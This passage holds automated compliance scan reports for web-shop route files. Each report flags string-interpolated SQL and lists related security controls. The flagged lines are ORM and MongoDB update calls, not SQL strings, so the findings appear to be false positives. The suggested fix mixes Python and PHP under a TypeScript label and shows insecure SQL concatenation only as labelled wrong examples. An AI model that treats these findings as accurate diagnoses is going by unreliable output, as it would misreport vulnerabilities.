"HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/profileImageUrlUpload.ts`
**Scanned at**: 2026-10-11T16:33:08.880814+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 32 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 32
await user?.update({ profileImage: `/assets/public/images/uploads/${loggedInUser.data.id}.${ext}` })
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-002](https://verify.example-org.internal/?id=HDR-M-002) | No Server Banners |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [SAST-M-002](https://verify.example-org.internal/?id=SAST-M-002) | Secure File Upload Validation |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 32, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/profileImageFileUpload.ts`
**Scanned at**: 2026-10-11T16:33:07.842830+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 50 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 50
await user.update({ profileImage: `assets/public/images/uploads/${loggedInUser.data.id}.${uploadedFileType.ext}` })
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [SAST-M-002](https://verify.example-org.internal/?id=SAST-M-002) | Secure File Upload Validation |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🟠 High | [LOG-M-004](https://verify.example-org.internal/?id=LOG-M-004) | Trusted Time Synchronization for Security Events |
| 🔴 Critical | [COOK-M-001](https://verify.example-org.internal/?id=COOK-M-001) | Secure Cookie Attributes (HttpOnly, Secure, SameSite) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 50, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/orderHistory.ts`
**Scanned at**: 2026-10-11T16:33:08.098817+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 36 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 36
await ordersCollection.update({ _id: req.params.id }, { $set: { delivered: deliveryStatus, eta } })
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🟠 High | [IDOR-M-006](https://verify.example-org.internal/?id=IDOR-M-006) | Log Authorization Failures |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 36, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/metrics.ts`
**Scanned at**: 2026-10-11T16:33:08.623478+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 220 |

